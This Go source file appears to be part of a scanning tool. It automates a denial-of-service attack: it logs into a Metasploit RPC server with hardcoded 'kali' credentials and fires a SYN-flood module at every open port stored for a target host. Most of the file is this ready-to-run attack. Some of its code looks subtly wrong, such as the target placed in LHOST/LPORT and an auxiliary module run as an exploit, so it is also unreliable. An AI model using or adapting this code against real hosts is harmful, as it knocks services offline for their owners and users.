package attack

import (
	"strconv"
	"toolscan/core/model"
	"toolscan/core/utils"

	"github.com/hupe1980/gomsf"
	"github.com/jinzhu/gorm"
)

func MetasploitAttack(kind string, target string) {
	switch kind {
	case "ddos":
		utils.Config.Log.LogInfo("Executing DDOS attack on " + target)
		DDOSAll(utils.Config.DB, target)
	default:
		utils.Config.Log.LogInfo("Can't perform attack")
		return
	}
}

func DDOSAll(db *gorm.DB, target string) {
	// get port
	host := model.GetHostByAddress(db, target)
	ports := host.Ports

	// init RPC clinet to communicate with metasploit
	// msfrpcd -U kali -P kali
	client, err := gomsf.New("0.0.0.0:55553")
	if err != nil {
		panic(err)
	}
	if err := client.Login("kali", "kali"); err != nil {
		panic(err)
	}
	defer client.Logout()
	utils.Config.Log.LogInfo("Create client RPC to metasploit successfully")
	for _, port := range ports {
		utils.Config.Log.LogInfo("Executing DDOS attack on port " + strconv.Itoa(port.Number))
		DDOSSingle(target, port.Number, client)
	}
}

func DDOSSingle(target string, port int, client *gomsf.Client) {
	utils.Config.Log.LogInfo("Use module auxiliary/dos/tcp/synflood")
	executeResult, err := client.Module.Execute(gomsf.ExploitType, "auxiliary/dos/tcp/synflood", map[string]interface{}{
		"LHOST": target,
		"LPORT": port,
	})
	if err != nil {
		panic(err)
	}
	utils.Config.Log.LogInfo("JobID: " + strconv.Itoa(int(executeResult.JobID)))
	utils.Config.Log.LogInfo("UUID: " + executeResult.UUID)
}
